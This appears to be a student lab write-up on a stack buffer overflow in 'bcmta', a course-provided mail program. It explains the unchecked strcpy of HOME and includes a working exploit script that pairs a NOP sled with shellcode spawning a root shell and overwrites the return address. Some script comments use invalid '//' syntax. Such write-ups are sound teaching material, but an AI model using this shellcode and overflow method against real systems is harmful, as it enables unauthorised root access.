Yixuan Wang(yixua003) Qicheng Shi(shixx752) Ruoyan Kong (kong0135)

1. What mistakes in the source code bcmta.c make the exploit possible?
	In the accelerated_strcpy function, it doesn't check the length of the destination string, so it's easy to overflow the destination string with longer length. Then observe the following part which use the accerlerated_strcpy (define as strcpy):
char *process_local_rcpt(char *addr, struct passwd *pw, int *smtp_code,
			 int skip_fwd) {
    struct rcpt_info rcpt;
    char fwd_filename[512];
    if (pw->pw_uid == getuid() && getenv("HOME")) {
	strcpy(fwd_filename, getenv("HOME")); // if the HOME variable's length is settled well, it can be longer than the fwd_filename, thus overflow the rcpt, and reach the return address of the process_local_rcpt. We can overflow the return address with shellcode. The shellcode then run the rootshell as root.





2. explain how you constructed your inputs
Out input: 
#!/bin/bash
// Put shellcode in an environment variable. We repeat 8000 times to make the shellcode 
// environment variable pretty large compared to the total size of all the other environment 
// variables so we won't miss it. "\x55\x89..." is hex for/bin/rootshell.
export SHELLCODE=$(perl -e 'print "\x90" x 8000, "\x55\x89\xe5\x68\x6c\x6c\x20\x20\x68\x74\x73\x68\x65\x68\x2f\x72\x6f\x6f\x68\x2f\x62\x69\x6e\x31\xc9\x88\x4d\xfe\x31\xc0\xb0\x0b\x8d\x5d\xf0\x31\xc9\x31\xd2\xcd\x80\x00"')

// 1604 is the store distance bwtween the beginning of the filename string and the return address of process_local_rcpt (sizeof(filename)+sizeof(rcpt)+sizeof(ebp)). We reach this position to overflow the return address.
HOME=$(perl -e 'print "A" x 1604')
// A good target for the shellcode is around a page down from the start
of the stack, say 0xffffc0ff. 
HOME="${HOME}$(echo -e "\xff\xc0\xff\xff")"
export HOME

// now we can all the bcmta to invoke the shellcode, which then invoke the rootshell
(echo -e ".")| /usr/bin/bcmta -f test -t test@localhost

3. Explain step-by-step what happens when an ordinary user runs exploit.sh.
Firstly, a shellcode of /bin/rootshell is exported to environment variable. 
Secondly, the HOME variable is being input 1604 characters, which ends with the target of the shellcode. 
Thirdly, we run bcmta, bcmta run to process_local_rcpt, whose return address is then overflowed by the unsafe strcpy, then invoke the shellcode, which invoke rootshell, and run it as root.

